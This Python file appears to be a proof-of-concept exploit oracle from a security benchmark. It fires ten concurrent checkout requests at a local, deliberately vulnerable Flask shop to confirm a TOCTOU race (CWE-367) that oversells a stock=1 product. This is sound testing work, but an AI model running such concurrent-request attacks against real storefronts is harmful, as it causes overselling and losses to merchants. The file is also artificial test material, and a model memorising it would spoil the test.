"""PoC exploit: TOCTOU race condition in async checkout processing (CWE-367).

After the 3-stage chain:
- Stage 1 implements checkout endpoint with synchronous stock validation
- Stage 2 adds a stock availability pre-check: skip if stock < quantity
- Stage 3 moves checkout processing to a background thread, returning 201 immediately

The vulnerability: the stock check reads product['stock'] in the main thread,
but stock is only decremented after the background thread starts the slow
processing work (~1 second). During that window, concurrent checkout requests
all see the same stock value, all pass the stock check, and each spawns its
own background thread.

Result: N concurrent checkout requests for a product with stock=1 cause N
orders to be created and stock goes to -(N-1). Classic overselling.

The attack:
1. Check initial stock for product 4 (Limited Edition Watch, stock=1)
2. Send 10 concurrent POST /checkout requests for quantity=1 of product 4
3. Wait for background threads to complete
4. Check GET /products/4 — stock < 0 confirms the race
5. Check GET /orders — multiple orders confirms overselling
"""

import json
import threading
import time

from mosaic.oracle.exploit import ExploitTest


class CheckoutRaceExploit(ExploitTest):
    """TOCTOU race condition in async checkout — overselling via concurrent requests."""

    def __init__(self, base_url: str = "http://localhost:5205"):
        super().__init__(base_url)
        self._target_product_id: int = 4  # Limited Edition Watch, stock=1

    @property
    def chain_id(self) -> str:
        return "flask_checkout_race"

    def setup(self) -> None:
        """Verify the target product exists and has stock=1."""
        resp = self.http_get(f"/products/{self._target_product_id}")
        if resp.ok:
            product = resp.json()
            if isinstance(product, dict):
                stock = product.get("stock", 0)
            elif isinstance(product, list) and product:
                stock = product[0].get("stock", 0) if isinstance(product[0], dict) else 0
            else:
                stock = 0
            if stock != 1:
                print(f"  WARNING: Expected stock=1, got stock={stock}")
        else:
            print(f"  WARNING: Could not fetch product {self._target_product_id}: {resp.status_code}")

    def execute(self) -> tuple[bool, str]:
        """Send concurrent checkouts and check for overselling."""
        # Get initial stock
        init_resp = self.http_get(f"/products/{self._target_product_id}")
        if not init_resp.ok:
            return False, f"GET /products/{self._target_product_id} returned {init_resp.status_code}"

        init_data = init_resp.json()
        if isinstance(init_data, dict):
            initial_stock = init_data.get("stock", 0)
        elif isinstance(init_data, list) and init_data:
            initial_stock = init_data[0].get("stock", 0) if isinstance(init_data[0], dict) else 0
        else:
            initial_stock = 0

        num_concurrent = 10
        results = [None] * num_concurrent
        errors = []

        def send_checkout(idx: int) -> None:
            """Send a single checkout POST in a thread."""
            try:
                resp = self.http_post(
                    "/checkout",
                    json={
                        "product_id": self._target_product_id,
                        "quantity": 1,
                    },
                    headers={"Content-Type": "application/json"},
                )
                results[idx] = resp
            except Exception as e:
                errors.append(f"Thread {idx}: {e}")

        # Fire all checkouts concurrently
        threads = []
        for i in range(num_concurrent):
            t = threading.Thread(target=send_checkout, args=(i,))
            threads.append(t)

        # Start all threads as close together as possible
        for t in threads:
            t.start()

        # Wait for all to complete
        for t in threads:
            t.join(timeout=10)

        if errors:
            return False, f"HTTP errors during concurrent requests: {errors}"

        # Count responses
        success_count = sum(1 for r in results if r and r.status_code == 201)
        reject_count = sum(1 for r in results if r and r.status_code == 409)

        # Wait for background threads to complete processing
        time.sleep(3)

        # Check the product stock
        product_resp = self.http_get(f"/products/{self._target_product_id}")
        if not product_resp.ok:
            return False, f"GET /products/{self._target_product_id} returned {product_resp.status_code}"

        product = product_resp.json()
        if isinstance(product, dict):
            final_stock = product.get("stock", 0)
        elif isinstance(product, list) and product:
            final_stock = product[0].get("stock", 0) if isinstance(product[0], dict) else 0
        else:
            final_stock = 0

        # Check how many orders were created
        orders_resp = self.http_get("/orders")
        order_count = 0
        if orders_resp.ok:
            orders_data = orders_resp.json()
            if isinstance(orders_data, list):
                all_orders = orders_data
            elif isinstance(orders_data, dict):
                all_orders = orders_data.get("orders", orders_data.get("items", orders_data.get("data", [])))
            else:
                all_orders = []
            order_count = len([
                o for o in all_orders
                if isinstance(o, dict) and o.get("product_id") == self._target_product_id
            ])

        evidence_parts = [
            f"Initial stock: {initial_stock}.",
            f"Sent {num_concurrent} concurrent checkouts for quantity=1.",
            f"Responses: {success_count} accepted (201), {reject_count} rejected (409).",
            f"Final stock: {final_stock}.",
            f"Orders created for this product: {order_count}.",
        ]

        if final_stock < 0 or order_count > initial_stock:
            return True, (
                f"TOCTOU race confirmed (CWE-367). "
                f"Overselling detected: {order_count} orders created for product "
                f"with initial stock={initial_stock}. Final stock={final_stock}. "
                f"The stock check reads product['stock'] in the main thread, but "
                f"stock is only decremented after the background thread starts "
                f"processing. Concurrent requests all see stock={initial_stock}, "
                f"all pass the check, and each spawns a thread that decrements. "
                + " ".join(evidence_parts)
            )

        if success_count > 1:
            # Multiple checkouts accepted but stock didn't go negative —
            # the race window may exist but was very narrow
            return True, (
                f"TOCTOU race likely (CWE-367). "
                f"{success_count} concurrent checkouts accepted for product "
                f"with stock={initial_stock}. Final stock={final_stock}. "
                f"Multiple orders created ({order_count}), indicating the "
                f"stock check passed for multiple requests before any "
                f"background thread decremented stock. "
                + " ".join(evidence_parts)
            )

        return False, (
            f"No overselling detected. "
            f"Only {success_count} checkout(s) accepted, "
            f"{reject_count} rejected. Final stock={final_stock}. "
            f"Stock check may be working correctly. "
            + " ".join(evidence_parts)
        )
